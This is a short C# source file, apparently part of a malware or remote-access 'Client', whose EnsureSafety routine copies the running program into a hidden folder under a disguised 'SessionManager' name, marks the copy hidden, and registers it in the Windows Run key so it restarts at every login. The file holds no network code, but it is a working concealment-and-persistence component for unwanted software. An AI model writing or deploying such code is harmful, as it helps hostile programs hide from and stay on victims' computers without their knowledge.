using System;
using System.IO;
using System.Linq;
using Microsoft.Win32;
using System.Threading;
using System.Diagnostics;

namespace Client
{
    class CoreFunctionality
    {
        public static string BSName = "SessionManager";
        public static string UserName = Environment.UserName;
        public static string PreferredDirectory = @$"C:\Users\{UserName}\{BSName}\";
        public static string CurrentDirectory = @$"{Directory.GetCurrentDirectory()}\";
        public static string CurrentFileName = $@"{System.Diagnostics.Process.GetCurrentProcess().ProcessName}.exe";

        public static void EnsureSafety(string[] args)
        {
            
            if (args.Contains("-startup"))
            {
                return;
            }

            var directory = Directory.CreateDirectory(PreferredDirectory);
            directory.Attributes = FileAttributes.Directory | FileAttributes.Hidden;

            File.Copy(CurrentDirectory + CurrentFileName, $"{PreferredDirectory}{BSName}.exe", true);
            File.SetAttributes($"{PreferredDirectory}{BSName}.exe", File.GetAttributes($"{PreferredDirectory}{BSName}.exe") | FileAttributes.Hidden);

            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
            {
                key.SetValue(BSName, "\"" + PreferredDirectory + $"{BSName}.exe" + "\" -startup");
            }

            var StartInfo = new ProcessStartInfo();

            StartInfo.CreateNoWindow = true;
            StartInfo.UseShellExecute = false;
            StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            StartInfo.Arguments = "-startup";

            Environment.Exit(0);
        }
    }
}
